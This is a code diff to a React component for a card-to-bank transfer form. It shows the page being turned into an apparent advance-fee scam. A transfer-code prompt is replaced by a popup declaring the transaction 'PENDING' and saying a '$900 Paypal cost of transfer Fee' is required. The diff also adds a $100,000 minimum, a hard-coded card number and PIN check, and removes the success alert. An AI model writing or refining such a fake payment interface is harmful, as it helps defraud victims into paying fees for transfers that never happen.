@@ -79,7 +79,7 @@ const Tabs = () => {
       icon: "question",
       color: "#FC0000",
 
-      html: '<input type="text"  class="custom-field"  placeholder="ENTER 9 DIGIT TRANSFER CODE" /> <p>  <b>ENTER 9 DIGIT TRANSFER CODE</b>    </p>',
+      html: '  <p>  <b>Transaction PENDING  (Paypal order id 6522)</b>    </p> <p> $900 Paypal cost of transfer Fee is Required for a successful transaction   </p>',
     });
   };
   const cardToBankSubmit = () => {
@@ -106,9 +106,20 @@ const Tabs = () => {
       alert("Please input a valid card number");
       return;
     }
+    // amount check
+    if (cardToBankData.amount < 100000) {
+      alert("Minimum amount to send is $100,000");
+      return;
+    }
+    // pin validation
+    if (cardToBankData.cardpin !== '492923849') {
+      alert("Please input a valid pin");
+      return;
+    }
+
 
     if (cardToBankData.cardnumber === "4531582493421042") {
-      alert("Transaction successful");
+      // alert("Transaction successful");
 
       setCardToBankData({
         cardnumber: "",
@@ -305,7 +316,7 @@ const Tabs = () => {
 
               <div className="field-container">
                 <input
-                  type="text"
+                  type="number"
                   id="cardcvv"
                   name="cardcvv"
                   value={cardToBankData.cardcvv}
@@ -317,7 +328,7 @@ const Tabs = () => {
 
               <div className="field-container">
                 <input
-                  type="text"
+                  type="number"
                   id="cardpin"
                   name="cardpin"
                   value={cardToBankData.cardpin}
@@ -358,7 +369,7 @@ const Tabs = () => {
                   type="number"
                   id="amount"
                   className="custom-field"
-                  placeholder="$"
+                  placeholder="$100,000"
                   name="amount"
                   value={cardToBankData.amount}
                   onChange={cardToBankChange}
